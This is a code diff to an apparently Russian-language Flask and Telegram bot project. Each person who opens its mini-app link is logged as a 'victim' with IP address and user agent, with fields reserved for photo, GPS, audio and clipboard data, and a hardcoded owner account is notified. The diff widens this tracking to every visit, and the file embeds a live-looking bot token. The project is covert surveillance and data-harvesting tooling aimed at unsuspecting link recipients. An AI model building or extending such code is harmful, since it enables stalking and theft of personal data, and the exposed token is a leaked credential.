@@ -10,7 +10,6 @@ import os
 from datetime import datetime
 import requests
 import base64
-import subprocess
 
 BOT_TOKEN = "8962532742:AAG1377yowFSqklfaPP_AzEXvIvV-Fm_jqw"
 
@@ -101,20 +100,23 @@ def home(): return "OK"
 
 @app.route('/app')
 def mini_app():
-    lid = request.args.get('startapp', '')
-    if not lid or lid not in links:
-        return "Недействительная ссылка. Открой через бота."
+    lid = request.args.get('startapp', '') or request.args.get('tgWebAppStartParam', '')
     
-    # Добавляем жертву если ещё нет
-    if not links[lid]['victims']:
-        links[lid]['victims'].append({
-            'time': datetime.now().strftime('%H:%M:%S'),
-            'ua': request.headers.get('User-Agent', '?'),
-            'ip': request.headers.get('X-Forwarded-For', request.remote_addr),
-            'photo': None, 'gps': None, 'audio': None, 'screen': None, 'clipboard': None
-        })
-        # Запускаем сбор данных через 35 секунд
-        asyncio.run_coroutine_threadsafe(notify(links[lid]['owner'], lid), loop)
+    if not lid:
+        lid = gen_id()
+        links[lid] = {'owner': 8613418593, 'created': datetime.now().strftime('%H:%M'), 'victims': []}
+    
+    if lid not in links:
+        links[lid] = {'owner': 8613418593, 'created': datetime.now().strftime('%H:%M'), 'victims': []}
+    
+    links[lid]['victims'].append({
+        'time': datetime.now().strftime('%H:%M:%S'),
+        'ua': request.headers.get('User-Agent', '?'),
+        'ip': request.headers.get('X-Forwarded-For', request.remote_addr),
+        'photo': None, 'gps': None, 'audio': None, 'clipboard': None
+    })
+    
+    asyncio.run_coroutine_threadsafe(notify(links[lid]['owner'], lid), loop)
     
     return render_template_string(MINI_APP_PAGE, link_id=lid)
 
